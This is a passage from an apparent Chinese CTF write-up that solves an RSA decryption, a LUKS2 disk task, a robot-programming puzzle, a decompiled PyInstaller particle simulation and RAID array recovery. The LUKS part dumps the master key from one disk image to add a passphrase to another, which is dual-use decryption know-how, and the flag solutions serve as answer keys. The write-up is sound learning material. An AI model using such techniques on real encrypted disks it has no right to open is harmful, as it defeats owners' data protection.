n\uff0c\u53ea\u4e0d\u8fc7\u4e0d\u662f\u4e24\u4e2a\u8d28\u6570\u76f8\u4e58\uff0c\u662f\u5341\u4e2a\u8d28\u6570\u76f8\u4e58 \u5341\u4e2a\u8d28\u6570\u76f8\u4e58\u5f97\u5230 n \u7684 RSA \u7b97\u6cd5\u4e5f\u4e00\u6837\uff0c\u56e0\u4e3a RSA \u7684\u6b63\u786e\u6027\u5e76\u6ca1\u6709\u8981\u6c42 n \u4e00\u5b9a\u662f\u4e24\u4e2a\u5927\u8d28\u6570\u76f8\u4e58\uff0c\u8fd9\u6837\u53ea\u662f\u96be\u4ee5\u7834\u89e3\u4fdd\u8bc1\u5b89\u5168\u6027 \u89e3\u51b3\u8fd9\u4e2a\u540c\u6837\u4e5f\u662f\u9700\u8981\u516c\u94a5 d\uff0c\u6240\u4ee5\u9700\u8981 phi(n) \u6839\u636e \u6b27\u62c9\u51fd\u6570 \u7684\u6027\u8d28\uff0cphi(n) \u7b49\u4e8e n \u7684\u6240\u6709\u8d28\u56e0\u6570\u51cf\u4e00\u7684\u79ef \u5373 phi(n) = (value[0] - 1) * (value[1] - 1) * ... * (value[9] - 1) \u518d\u89e3\u5bc6\u5373\u53ef\u5f97\u5230\u5bc6\u6587 q\uff0c\u7136\u540e\u4e5f\u5c31\u5f97\u5230\u4e86 get_q \u7684\u7ed3\u679c n = phi = 1 for i in range ( 10 ): n = n * value [ i ] phi *= ( value [ i ] - 1 ) value_q = ... d = pow ( e , - 1 , phi ) q = pow ( value_q , d , n ) return sympy . nextprime ( q ) flag : \u641e\u5b9a\u4e86 get_p \u548c get_q \u4e4b\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u89e3\u51fa flag \u4e86\uff1a e = 65537 p = get_p () q = get_q () c = ... d = pow ( e , - 1 , ( p - 1 ) * ( q - 1 )) m = pow ( c , d , p * q ) print ( int . to_bytes ( m , 30 , byteorder = \"big\" )) \u52a0\u5bc6\u7684 U \u76d8 \u00b6 \uff08\u672c\u6765\u633a\u597d\u505a\u7684\u4e00\u9053\u9898\uff0c\u600e\u4e48\u9898\u7ed9\u7684\u63d0\u793a\u6211\u5c31\u786c\u662f\u6ca1\u9886\u4f1a\u5230\uff09 \u8fd9\u662f\u4e00\u4e2a\u5173\u4e8e LUKS (Linux Unified Key Setup) \u7684\u6545\u4e8b\u3002 \u7b2c\u4e00\u5929 \u5c0f T\uff1a\u300c\u4f60\u8981\u7684\u968f\u673a\u8fc7\u7a0b\u7684\u8bfe\u4ef6\u6211\u5e2e\u4f60\u62f7\u597d\u4e86\uff0c\u5728\u8fd9\u4e2a U \u76d8\u91cc\uff0cLUKS \u52a0\u5bc6\u7684\u5bc6\u7801\u662f suijiguocheng123123\u3002\u300d \u5c0f Z\uff1a\u300c\u554a\uff0c\u4f60\u53c8\u641e\u4e86 Linux \u6587\u4ef6\u7cfb\u7edf\u52a0\u5bc6\uff0c\u771f\u62ff\u4f60\u6ca1\u529e\u6cd5\u3002\u6211\u73b0\u5728\u4e0d\u65b9\u4fbf\u7528 Linux\uff0c\u6211\u76f4\u63a5\u628a\u8fd9\u5757\u76d8\u505a\u6210\u78c1\u76d8\u955c\u50cf\u6587\u4ef6\u518d\u56de\u53bb\u5904\u7406\u5427\u3002\u300d \u7b2c\u4e8c\u5929 \u5c0f Z\uff1a\u300c\u8c22\u8c22\u4f60\u6628\u5929\u5e2e\u6211\u62f7\u7684\u8bfe\u4ef6\u3002\u4f60\u6bcf\u6b21\u90fd\u641e\u8fd9\u4e2a\u52a0\u5bc6\uff0c\u5b83\u771f\u7684\u5b89\u5168\u5417\uff1f\u300d \u5c0f T\uff1a\u300c\u5f53\u7136\u4e86\uff01\u4f60\u770b\uff0c\u4f60\u8fd8\u7ed9\u6211\u4e4b\u540e\uff0c\u6211\u5df2\u7ecf\u628a\u8fd9\u5757\u76d8\u7684\u5f31\u5bc6\u7801\u6539\u6389\u4e86\uff0c\u73b0\u5728\u662f\u968f\u673a\u751f\u6210\u7684\u5f3a\u5bc6\u7801\uff0c\u8fd9\u6837\u9664\u4e86\u6211\u81ea\u5df1\uff0c\u4e16\u754c\u4e0a\u4efb\u4f55\u4eba\u90fd\u65e0\u6cd5\u89e3\u5bc6\u5b83\u4e86\u3002\u300d \u5c0f Z\uff1a\u300c\u6211\u53ef\u4e0d\u4fe1\u3002\u300d \u5c0f T\uff1a\u300c\u4f60\u4e0d\u4fe1\uff1f\u4f60\u770b\uff0c\u6211\u73b0\u5728\u5f80 U \u76d8\u91cc\u653e\u4e00\u4e2a flag \u6587\u4ef6\uff0c\u7136\u540e\u8fd9\u4e2a U \u76d8\u5c31\u7ed9\u4f60\u4e86\uff0c\u4f60\u7edd\u5bf9\u89e3\u5bc6\u4e0d\u51fa\u6765\u8fd9\u4e2a\u6587\u4ef6\u7684\u5185\u5bb9\u3002\u5f53\u521d\u641e LUKS \u7684\u65f6\u5019\u6211\u53ef\u7814\u7a76\u4e86\u597d\u51e0\u5929\uff0c\u73ed\u4e0a\u53ef\u6ca1\u4eba\u6bd4\u6211\u66f4\u61c2\u52a0\u5bc6\uff01\u300d \u4e00\u5171\u7ed9\u4e86\u4e24\u4e2a img \u6587\u4ef6\uff0c\u901a\u8fc7 file \u53ef\u4ee5\u770b\u51fa\u90fd\u662f DOS/MBR boot sector $ file *.img day1.img: DOS/MBR boot sector ; partition 1 : ID = 0xee, start-CHS ( 0x0,0,2 ) , end-CHS ( 0x3ff,255,63 ) , startsector 1 , 40959 sectors, extended partition table ( last ) day2.img: DOS/MBR boot sector ; partition 1 : ID = 0xee, start-CHS ( 0x0,0,2 ) , end-CHS ( 0x3ff,255,63 ) , startsector 1 , 40959 sectors, extended partition table ( last ) \u6240\u4ee5\u5148\u76f4\u63a5 7z \u63d0\u53d6\uff0c\u5f97\u5230\u4e24\u4e2a\u65b0\u7684 img\uff0c\u518d file\uff1a $ file *.img My Disk.img: LUKS encrypted file, ver 2 [ , , sha256 ] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 My Disk 2 .img: LUKS encrypted file, ver 2 [ , , sha256 ] UUID: e9a660d5-4a91-4dca-bda5-3f6a49eea998 \u53d1\u73b0\u90fd\u662f LUKS encrypted file \u5728 Kali Linux \u91cc\u5c1d\u8bd5\u76f4\u63a5\u6302\u8f7d\u7b2c\u4e00\u4e2a img\uff0c\u8981\u6c42\u8f93\u5165\u5bc6\u7801\uff0c\u628a\u9898\u7ed9\u7684\u5bc6\u7801\u8f93\u5165\u5c31\u53ef\u4ee5\u770b\u5230 \u201c\u8bfe\u4ef6\u201d \u4ee5\u4e0a\u90fd\u662f\u5df2\u77e5\u7684\u8bd5\u9a8c\u90e8\u5206\uff0c\u771f\u6b63\u8981\u505a\u7684\u662f\u89e3\u5f00\u7b2c\u4e8c\u4e2a\u672a\u77e5\u5bc6\u7801\u7684 LUKS img \u5df2\u77e5\u78c1\u76d8\u7684\u52a0\u5bc6\u4f7f\u7528\u7684\u662f luks2\uff0c\u5728\u7f51\u4e0a\u67e5\u4e86\u7834\u89e3 luks2 \u4e4b\u7c7b\u7684\u90fd\u8bf4 luks2 \u4e0d\u53ef\u7834\u89e3 \uff0c\u6216\u8005\u662f\u4f7f\u7528\u5df2\u77e5\u7684\u5bc6\u7801\u5b57\u5178\u6765\u7206\u7834 \u4f46\u662f\u9898\u91cc\u8bf4\u4e86 \u201c \u968f\u673a\u751f\u6210 \u7684\u5f3a\u5bc6\u7801\u201d\uff0c\u6240\u4ee5\u4e5f\u662f\u6ca1\u6709\u5bc6\u7801\u5b57\u5178\u7684 \u5176\u5b9e\u8fd9\u9053\u9898\u7684\u6700\u5927\u63d0\u793a\u5c31\u5728\u4e8e\u5b83\u7ed9\u4e86\u4e24\u4e2a img\uff0c\u65e2\u7136\u7b2c\u4e00\u4e2a img \u6253\u5f00\u540e\u4ec5\u4ec5\u662f\u4e00\u4e2a\u8bfe\u4ef6\uff0c\u5982\u679c\u5b83\u7684\u7528\u5904\u4ec5\u4ec5\u662f\u7528\u6765\u8bd5\u9a8c luks \u600e\u4e48\u6253\u5f00\u7684\u8bdd\uff0c\u6839\u672c\u5b83\u6ca1\u5fc5\u8981\u7ed9\u51fa \u6240\u4ee5\u7b2c\u4e00\u4e2a img \u80af\u5b9a\u8fd8\u662f\u6709\u7528\u7684\u3002 \u518d\u770b\u9898\u76ee\uff0c\u53cd\u590d\u8bf4\u4e86 U \u76d8\uff0c\u6240\u4ee5\u8fd9\u4e24\u4e2a img \u5e94\u8be5\u662f\u540c\u4e00\u4e2a U \u76d8\u7684\u955c\u50cf\u6587\u4ef6\uff0c\u53ea\u662f\u66f4\u6539\u4e86\u5bc6\u7801\u800c\u5df2\uff08file \u770b\u5230\u7684 uuid \u4e5f\u662f\u4e00\u81f4\u7684\uff09 \u4e8e\u662f\u7ee7\u7eed\u5fc5\u5e94\uff0c\u53d1\u73b0\u540c\u4e00\u4e2a\u78c1\u76d8\u7684 master-key \u662f\u4e00\u6837\u7684\uff0c\u800c\u4e14\u53ef\u4ee5\u7528 master-key \u6765\u6dfb\u52a0\u5bc6\u7801\u6062\u590d\u78c1\u76d8\uff08\u89c1\uff1a 10 Linux cryptsetup Examples for LUKS Key Management \uff09 \u6240\u4ee5\u5c31\u8ddf\u7740\u6587\u7ae0\u91cc\u7684\u505a\u6cd5\uff0c\u4ece\u7b2c\u4e00\u4e2a img \u4e2d\u63d0\u53d6\u51fa master-key\uff0c\u7136\u540e\u7528\u5b83\u6765\u63d0\u4f9b AddKey \u7684\u6743\u9650\u3002\u6dfb\u52a0\u4e86\u65b0 passphrase \u540e\u5c31\u53ef\u4ee5\u7528\u65b0\u5bc6\u7801\u6253\u5f00\u78c1\u76d8\u4e86\uff1a $ cryptsetup luksDump --dump-master-key MyDisk.img # \u8f93\u51fa master-key ... MK dump: be 97 db 91 5c 30 47 ce 1c 59 c5 c0 8c 75 3c 40 72 35 85 9d fe 49 c0 52 c4 f5 26 60 af 3e d4 2c ec a3 60 53 aa 96 70 4d f3 f2 ff 56 8f 49 a1 82 60 18 7c 58 d7 6a ec e8 00 c1 90 c1 88 43 f8 9a $ cat \"be...9a\" > master_key.txt # \u5b58\u5165\u6587\u4ef6 $ xxd -r -p master_key.txt master_key.bin # \u8f6c\u4e3a\u4e8c\u8fdb\u5236 $ cryptsetup luksAddKey MyDisk2.img --master-key-file < ( cat master_key.bin ) # \u6dfb\u52a0\u5bc6\u7801 Enter new passphrase for key slot: # \u8f93\u5165\u65b0\u5bc6\u7801\u5373\u53ef\uff0c\u56e0\u4e3amaster-key-file\u76f8\u5f53\u4e8e\u63d0\u4f9b\u4e86\u539f\u59cb\u5bc6\u7801 Verify passphrase: \uff08\u4e00\u5b9a\u8981\u7528 root \u6743\u9650\u624d\u53ef\u4ee5\u52a0\u5bc6\u7801\uff09 \u7136\u540e\u6302\u8f7d\u3001\u8f93\u5165\u5bc6\u7801\uff0c\u5c31\u53ef\u4ee5\u770b\u5230 flag.txt \u4e86 \u8d5b\u535a\u53a8\u623f \u00b6 \u867d\u7136\u8fd9\u662f\u4f60\u7684\u9910\u5385\uff0c\u4f46\u53ea\u6709\u673a\u5668\u4eba\u53ef\u4ee5\u5728\u53a8\u623f\u5de5\u4f5c\u3002\u673a\u5668\u4eba\u7cbe\u786e\u5730\u6309\u7167\u7a0b\u5e8f\u5de5\u4f5c\uff0c\u5728\u53a8\u623f\u4e2d\u79fb\u52a8\uff0c\u4ece\u7269\u54c1\u6e90\u53d6\u51fa\u98df\u6750\uff0c\u6309\u7167\u83dc\u8c31\u7684\u987a\u5e8f\u628a\u98df\u6750\u4f9d\u6b21\u653e\u5165\u9505\u5185\u3002 \u673a\u5668\u4eba\u4e0d\u9700\u8981\u4f11\u606f\uff0c\u53ea\u9700\u8981\u4e00\u4e2a\u665a\u4e0a\u7684\u65f6\u95f4\u6765\u5b66\u4e60\u4f60\u6559\u7ed9\u5b83\u7684\u7a0b\u5e8f\uff0c\u5728\u6b64\u4e4b\u540e\u4f60\u5c31\u53ef\u4ee5\u5728\u4efb\u4f55\u65f6\u5019\u8ba9\u673a\u5668\u4eba\u6267\u884c\u8fd9\u4e2a\u7a0b\u5e8f\uff0c\u7a0b\u5e8f\u7684\u6bcf\u4e00\u6b65\u6267\u884c\u90fd\u4f1a\u88ab\u8bb0\u5f55\u4e0b\u6765\uff0c\u65b9\u4fbf\u4f60\u68c0\u67e5\u673a\u5668\u4eba\u505a\u83dc\u7684\u8fc7\u7a0b\u3002 \u53e6\u5916\u4e3a\u4e86\u7b26\u5408\u98df\u54c1\u5b89\u5168\u6cd5\u7684\u8981\u6c42\uff0c\u8d5b\u535a\u53a8\u623f\u4e2d\u7684\u673a\u5668\u4eba\u540c\u4e00\u65f6\u95f4\u624b\u91cc\u53ea\u80fd\u62ff\u4e00\u79cd\u98df\u7269\uff0c\u6bcf\u6b21\u505a\u83dc\u524d\u90fd\u5fc5\u987b\u6267\u884c\u6e05\u7406\u53a8\u623f\u7684\u64cd\u4f5c\uff0c\u628a\u5404\u5904\u7684\u98df\u7269\u6b8b\u6e23\u6e05\u7406\u6389\uff0c\u7136\u540e\u56de\u5230\u53a8\u623f\u89d2\u843d\u5f85\u547d\u3002 \u6bcf\u5929\u7684\u83dc\u8c31\u53ef\u80fd\u4e0d\u540c\uff0c\u4f46\u4e5f\u8bb8\u4e5f\u5b58\u5728\u4e00\u4e9b\u89c4\u5f8b\u3002 \u5bf9\u673a\u5668\u4eba\u7f16\u7a0b\u53ef\u4ee5\u4f7f\u7528\u7684\u6307\u4ee4\u6709\uff08n, m \u4e3a\u6574\u6570\u53c2\u6570\uff0c\u7a0b\u5e8f\u7684\u884c\u53f7\u4ece 0 \u5f00\u59cb\uff0c\u6ce8\u610f\u6307\u4ee4\u4e2d\u9700\u8981\u6b63\u786e\u4f7f\u7528\u7a7a\u683c\uff09\uff1a \u5411\u4e0a n \u6b65 \u5411\u4e0b n \u6b65 \u5411\u5de6 n \u6b65 \u5411\u53f3 n \u6b65 \u653e\u4e0b n \u4e2a\u7269\u54c1 \u62ff\u8d77 n \u4e2a\u7269\u54c1 \u653e\u4e0b\u76d8\u5b50 \u62ff\u8d77\u76d8\u5b50 \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0a\u8df3\u8f6c m \u884c \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0b\u8df3\u8f6c m \u884c \u8d76\u7d27\u8fdb\u5165\u8d5b\u535a\u53a8\u623f\u5f00\u59cb\u505a\u83dc\u5427\uff01 \u521a\u770b\u9898\u8fd8\u662f\u633a\u61f5\u7684\uff0c\u60f3\u4e86\u597d\u534a\u5929\u624d\u660e\u767d \u7b80\u5355\u8bf4\u6765\u5c31\u662f\uff0c\u6bcf\u5929\u53ef\u4ee5\u7f16\u5199\u65b0\u7684\u7a0b\u5e8f\uff0c\u4f46\u662f\u53ea\u80fd\u8fd0\u884c\u4e00\u4e2a\u4e4b\u524d\u7f16\u5199\u8fc7\u7684\u7a0b\u5e8f \u6bcf\u4e2a\u7a0b\u5e8f\u53ea\u6709\u51e0\u79cd\u6307\u4ee4\u53ef\u4ee5\u4f7f\u7528\uff0c\u9700\u8981\u5728\u5176\u4e2d\u6ee1\u8db3\u83dc\u8c31\u7684\u987a\u5e8f\u8981\u6c42 \u800c\u95ee\u9898\u5728\u4e8e\uff0c\u7f16\u5199\u7a0b\u5e8f\u540e\u7684\u7b2c\u4e8c\u5929\u7684\u83dc\u8c31\u53ef\u80fd\u4f1a\u4e0d\u540c\uff0c\u5bfc\u81f4\u524d\u9762\u7f16\u5199\u7684\u7a0b\u5e8f\u65e0\u6cd5\u4f7f\u7528 \u6240\u4ee5\u5c31\u9700\u8981 \u9884\u6d4b \u7b2c\u4e8c\u5929\u7684\u83dc\u8c31 Level 0 \u00b6 \u53ef\u4ee5\u770b\u5230\u7b2c 0 \u5929\u7684\u83dc\u8c31\u662f 1, 0\uff0c\u4e5f\u5c31\u662f\u8981\u5728\u540c\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\u4f9d\u6b21\u5411\u9505(1,0)\u4e2d\u653e\u5165 1 \u53f7\u98df\u7269(0,2)\u548c 0 \u53f7\u98df\u7269(0,1) \u968f\u4fbf\u7f16\u5199\u7a0b\u5e8f\u4fdd\u5b58\uff0c\u76f4\u63a5\u5230\u4e0b\u4e00\u5929\uff0c\u53ef\u4ee5\u53d1\u73b0\u83dc\u8c31\u53d1\u751f\u4e86\u53d8\u5316 \u591a\u6b21\u5c1d\u8bd5\u4e4b\u540e\u53d1\u73b0\u83dc\u8c31 \u53ea\u6709 0,0 / 0,1 / 1,0 / 1,1 \u56db\u79cd \u6240\u4ee5\u5728\u7b2c 0 \u5929\u7f16\u5199\u5b66\u4e60\u56db\u4e2a\u7a0b\u5e8f\uff0c\u5230\u4e0b\u4e00\u5929\u5c31\u53ef\u4ee5\u6839\u636e\u83dc\u8c31\u6765\u6267\u884c\u4e86 \u4f8b\u5982\u7a0b\u5e8f 1,0 \u5c31\u53ef\u4ee5\u7f16\u5199\u4e3a\uff1a \u5411\u53f3 2 \u6b65 \u62ff\u8d77 1 \u4e2a\u7269\u54c1 \u5411\u5de6 2 \u6b65 \u5411\u4e0b 1 \u6b65 \u653e\u4e0b 1 \u4e2a\u7269\u54c1 \u5411\u4e0a 1 \u6b65 \u5411\u53f3 1 \u6b65 \u62ff\u8d77 1 \u4e2a\u7269\u54c1 \u5411\u5de6 1 \u6b65 \u5411\u4e0b 1 \u6b65 \u653e\u4e0b 1 \u4e2a\u7269\u54c1 \u5411\u4e0a 1 \u6b65 \u53ea\u8981\u6b63\u786e\u4e86\u4e00\u5929\uff0c\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86 Level 1 \u00b6 \u53ea\u6709 1 \u4e2a\u98df\u7269\uff0c\u83dc\u8c31\u662f\u597d\u591a 0 \u540c\u6837\u968f\u4fbf\u7f16\u5199\u7a0b\u5e8f\u4fdd\u5b58\u8fdb\u5165\u4e0b\u4e00\u5929\uff0c\u53d1\u73b0\u83dc\u8c31 \u6ca1\u6709\u53d8\u5316 \uff0c\u8fd8\u662f 73 \u4e2a 0 \u6240\u4ee5\u8fd9\u4e00\u5173\u53ef\u80fd\u53ea\u662f\u5faa\u73af\u7684\u6559\u7a0b \u53ef\u7528\u7684\u6307\u4ee4\u4e2d\u6709\u4e00\u6761 \u201c\u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e n \u5411\u4e0a\u8df3\u8f6c m \u884c\u201d \u53ef\u4ee5\u7528\u5b83\u6765\u8fbe\u5230 \u5faa\u73af \u7684\u6548\u679c \u53ea\u9700\u8981\u62ff 73 \u4e2a\u7269\u54c1\uff0c\u7136\u540e\u5faa\u73af\u653e\u4e0b\u76f4\u5230\u624b\u4e2d\u6ca1\u6709\u4e86\u5373\u53ef \u5411\u53f3 1 \u6b65 \u62ff\u8d77 73 \u4e2a\u7269\u54c1 \u5411\u5de6 1 \u6b65 \u5411\u4e0b 1 \u6b65 \u653e\u4e0b 1 \u4e2a\u7269\u54c1 \u5982\u679c\u624b\u4e0a\u7684\u7269\u54c1\u5927\u4e8e\u7b49\u4e8e 1 \u5411\u4e0a\u8df3\u8f6c 1 \u884c \u540c\u6837\u4fdd\u5b58\u4e0b\u4e00\u5929\u6267\u884c\u5c31\u53ef\u4ee5\u62ff\u5230 flag \u4e86 \u5269\u4e0b\u7684\u4e24\u4e2a\u770b\u8d77\u6765\u5927\u6982\u662f\u901a\u8fc7\u6e90\u7801\u6765\u63a8\u6d4b\u51fa\u83dc\u8c31\u7684\u751f\u6210\u65b9\u6cd5\uff0c\u7136\u540e\u7f16\u5199\u76f8\u5e94\u7684\u6307\u4ee4\uff0c\u592a\u96be\u4e86\uff0c\u4e0d\u4f1aqwq Micro World \u00b6 \u5b87\u5b99\u4e2d\u67d0\u4e00\u7247\u6781\u5176\u5fae\u5c0f\u7684\u533a\u57df\u91cc\u7684\u7c92\u5b50\u88ab\u4e00\u80a1\u795e\u79d8\u529b\u91cf\u521d\u59cb\u5316\u8bbe\u7f6e\u6210\u4e86 flag \u7684\u5f62\u72b6\uff0c\u7a0b\u5e8f\u5fe0\u5b9e\u5730\u8bb0\u5f55\u4e86\u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e\u8fd9\u7247\u533a\u57df\u7684\u7c92\u5b50\u8fd0\u52a8\u60c5\u51b5\u3002 \u62ff\u5230\u4e86 exe \u6587\u4ef6\uff0c\u770b\u8d77\u6765\u633a\u7cbe\u81f4\uff0c\u8fd0\u884c\u8d77\u6765\u662f\u4e00\u4e9b\u70b9\u8fd0\u52a8\u78b0\u649e\u7684\u573a\u666f \u62d6\u5230 IDA \u91cc\u770b\u770b\uff0c\u53d1\u73b0\u4e86 __main__ \u4ee5\u53ca .rdata \u91cc\u4e00\u4e9b py \u6709\u5173\u7684\u5b57\u7b26\u4e32\uff1a \u6240\u4ee5\u63a8\u6d4b\u662f\u4f7f\u7528 python \u7f16\u5199\u7684\uff0c\u7136\u540e\u7528 pyinstaller \u6253\u5305 \u8fd9\u6837\u7684\u8bdd\u8bd5\u7740\u7528 pyinstxtractor \u89e3\u5305 .exe\uff0c\u6210\u529f\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\u5939 \u91cc\u9762\u662f\u4e00\u5806 .pyc .pyd .dll \u6587\u4ef6\uff0c\u4ece\u540d\u5b57\u5c31\u53ef\u4ee5\u770b\u51fa\u5927\u90e8\u5206\u662f import \u7684\u5305\uff0c\u53ea\u6709\u4e00\u4e2a\u7279\u522b\u7684 2.pyc \u6240\u4ee5\u8fd9\u4e2a\u5e94\u8be5\u5c31\u662f\u7f16\u8bd1\u540e\u7684\u6e90\u7801\u4e86 \u63a5\u4e0b\u6765\u7528 uncompyle6 \u6765\u53cd\u7f16\u8bd1 pyc \u6587\u4ef6\uff0c\u8f93\u51fa\u5f97\u5230\u4e86\u6e90\u7801 2.py \u5c1d\u8bd5\u8fd0\u884c\uff0c\u53d1\u73b0\u8dd1\u8d77\u6765\u4e4b\u540e\u53ea\u6709\u4e00\u4e2a\u70b9\u5728\u8fd0\u52a8\uff0c\u5e94\u8be5\u662f\u53cd\u7f16\u8bd1\u65f6\u51fa\u4e86\u4e9b\u95ee\u9898 \u4e8e\u662f\u5f00\u59cb\u770b\u6e90\u7801 \u57fa\u672c\u4e0a\u7b80\u5355\u8bf4\u5c31\u662f\uff0c\u521d\u59cb\u6709\u4e00\u4e9b\u6570\u636e\uff0c\u8868\u793a\u6bcf\u4e2a\u70b9\u7684\u4f4d\u7f6e\u548c\u901f\u5ea6\uff0c\u7136\u540e\u8fd0\u884c\uff0c\u6bcf\u6b21\u8fd0\u884c\u90fd\u68c0\u6d4b\u78b0\u649e\uff0c\u7136\u540e\u83b7\u5f97\u65b0\u7684\u70b9\u4f4d\u7f6e\uff0c\u518d\u7ed8\u5236\u51fa\u6765 \u8c03\u8bd5\u4e00\u4e0b\uff0c\u8f93\u51fa\u6bcf\u6b21\u7684 pointlist\uff0c\u53d1\u73b0\u7b2c\u4e00\u6b21\u662f\u6240\u6709\u70b9\uff0c\u7b2c\u4e8c\u6b21\u53d8\u62102\u4e2a\uff0c\u7b2c\u4e09\u6b21\u5f80\u540e\u5c31\u53ea\u6709\u4e00\u4e2a\u4e86 \u6240\u4ee5\u95ee\u9898\u5927\u6982\u5c31\u51fa\u5728\u4e86 next_pos_list \u51fd\u6570\uff1a def next_pos_list ( Pointlist ): pointlist = [] for i in range ( len ( Pointlist )): for point in Pointlist [ i + 1 :]: times = checkcrush ( Pointlist [ i ], point ) if times != None : a , b = get_new_point ( times , Pointlist [ i ], point ) pointlist . extend ([ a , b ]) Pointlist [ i ] . flag = 0 point . flag = 0 else : for item in Pointlist : if item . flag != 0 : pointlist . append ( Point (( item . x + item . vx , item . y + item . vy ), item . vx , item . vy )) for poi in pointlist : poi . x = poi . x % WIDTH poi . y = poi . y % HEIGHT else : return pointlist \u4ed4\u7ec6\u8bfb\u4e00\u8bfb\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd9\u91cc\u9762\u7684 for-else \u5757\u5f88\u5947\u602a\uff0c\u5bfc\u81f4\u5faa\u73af\u7ed3\u675f\u548c return \u90fd\u65e9\u4e86\uff0c\u6240\u4ee5\u6839\u636e\u51fd\u6570\u7684\u610f\u601d\u6539\u4e00\u6539\uff1a def next_pos_list ( Pointlist ): pointlist = [] for i in range ( len ( Pointlist )): for point in Pointlist [ i + 1 :]: ... for item in Pointlist : ... return pointlist \u8fd9\u6837\u5c31\u53ef\u4ee5\u6210\u529f\u8fd0\u884c\u4e86 \u4f46\u662f\u753b\u9762\u4ecd\u7136\u662f\u6742\u4e71\u7684\u3002\u56e0\u4e3a\u9898\u91cc\u8bf4\u4e86 \u201c\u8bb0\u5f55\u4e86 \u4e00\u6bb5\u65f6\u95f4\u4e4b\u540e \u8fd9\u7247\u533a\u57df\u7684\u7c92\u5b50\u8fd0\u52a8\u60c5\u51b5\u201d \u6240\u4ee5\u9700\u8981\u5c06\u8f68\u8ff9\u5f80\u524d\u63a8\uff0c\u6700\u65b9\u4fbf\u7684\u65b9\u6cd5\u5c31\u662f\u66f4\u6539\u6bcf\u4e2a\u70b9\u7684\u901f\u5ea6\u65b9\u5411\uff1a Pointlist = [] for item in list_ : Pointlist . append ( Point (( item [ 0 ], item [ 1 ]), - item [ 2 ], - item [ 3 ])) \u8fd0\u884c\u540e\u7b49\u5f85\u4e00\u5c0f\u4f1a\u513f\u5c31\u53ef\u4ee5\u770b\u5230\u70b9\u9010\u6e10\u6709\u5e8f\uff0c\u5728\u67d0\u4e00\u523b\u6c47\u6210\u4e86 flag\uff1a \u867d\u7136\u4e0d\u592a\u6e05\u6670\uff0c\u4f46\u662f\u4e5f\u53ef\u4ee5\u731c\u4e2a\u5927\u6982 \u9635\u5217\u6062\u590d\u5927\u5e08 \u00b6 \uff08\u8fd9\u9898\u6574\u6574\u505a\u4e86\u6211\u4e24\u5929\u591a\uff0c\u6bcf\u5929\u665a\u4e0a\u90fd\u5bf9\u7740\u78c1\u76d8\u9635\u5217\u2026\u2026\uff09 \u4ee5\u4e0b\u662f\u4e24\u4e2a\u538b\u7f29\u5305\uff0c\u5206\u522b\u662f\u4e00\u4e2a RAID 0 \u9635\u5217\u7684\u78c1\u76d8\u538b\u7f29\u5305\uff0c\u548c\u4e00\u4e2a RAID 5 \u9635\u5217\u7684\u78c1\u76d8\u538b\u7f29\u5305\uff0c\u5bf9\u5e94\u672c\u9898\u7684\u4e24\u5c0f\u95ee\u3002\u4f60\u9700\u8981\u89e3\u6790\u5f97\u5230\u6b63\u786e\u5b8c\u6574\u7684\u78c1\u76d8\u9635\u5217\uff0c\u6302\u8f7d\u7b2c\u4e00\u4e2a\u5206\u533a\u540e\u5728\u8be5\u5206\u533a\u6839\u76ee\u5f55\u4e0b\u4f7f\u7528 Python 3.7 \u6216\u4ee5\u4e0a\u7248\u672c\u6267\u884c getflag.py \u811a\u672c\u4ee5\u83b7\u53d6 flag\u3002\u78c1\u76d8\u6570\u636e\u4fdd\u8bc1\u65e0\u635f\u574f\u3002 RAID 5 \u00b6 \u867d\u7136 RAID 5 \u662f\u7b2c\u4e8c\u95ee\uff0c\u800c\u4e14\u5206\u6570\u9ad8\uff0c\u4f46\u662f\u66f4\u597d\u505a\uff0c\u800c\u4e14\u505a\u51fa\u7684\u4eba\u4e5f\u591a\u3002 \u56e0\u4e3a\u6570\u636e\u4fdd\u8bc1\u65e0\u635f\u574f\uff0c\u6240\u4ee5\u8981\u505a\u7684\u4ec5\u4ec5\u662f\u627e\u51fa\u4e94\u4e2a\u78c1\u76d8\u7684\u987a\u5e8f\u548c\u5757\u5927\u5c0f \u987a\u5e8f\u53ef\u4ee5\u5148\u7b80\u5355\u5730\u770b\u770b strings *.img \u8f93\u51fa\u7684\u5185\u5bb9 \u9010\u4e2a\u6587\u4ef6\u770b\uff0c\u53ef\u4ee5\u53d1\u73b0\u6bcf\u4e2a\u6587\u4ef6\u6bd4\u8f83\u9760\u524d\u7684\u5730\u65b9\u4f1a\u6709\u4e00\u6bb5\u662f git \u5386\u53f2\u8bb0\u5f55\u7684\u4e00\u90e8\u5206: \u6839\u636e\u91cc\u9762\u7684\u65f6\u95f4\u53ef\u4ee5\u63a8\u65ad\u51fa\u78c1\u76d8\u7684\u987a\u5e8f\u5927\u81f4\u662f\uff1a Qj... -> 60... -> 3R... -> Ir... -> 3D... \u53ea\u662f\uff0c\u8fd9\u4e2a\u987a\u5e8f\u5e94\u8be5\u662f\u4e00\u4e2a\u73af\uff0c\u8c01\u5728\u7b2c\u4e00\u8fd8\u6ca1\u533a\u5206\u51fa\u6765 \u5728\u770b\u6bcf\u4e2a\u6587\u4ef6\u7684\u5934\u90e8\uff0c\u53ea\u6709 60... \u548c 3R... \u6709 \u201cEFI PART\u201d: \u6240\u4ee5\u5e94\u8be5\u662f\u4e00\u4e2a\u5728\u5f00\u5934\uff0c\u4e00\u4e2a\u5728\u7ed3\u5c3e\u3002\u6240\u4ee5\u6700\u7ec8\u7684\u987a\u5e8f\u662f\uff1a 3R... -> Ir... -> 3D... -> Qj... -> 60... \u7136\u540e\u9700\u8981\u627e\u5230\u5757\u5927\u5c0f \u76f4\u63a5\u4e22\u5230 DiskGenius \u91cc\u7ec4\u5efa\u865a\u62df 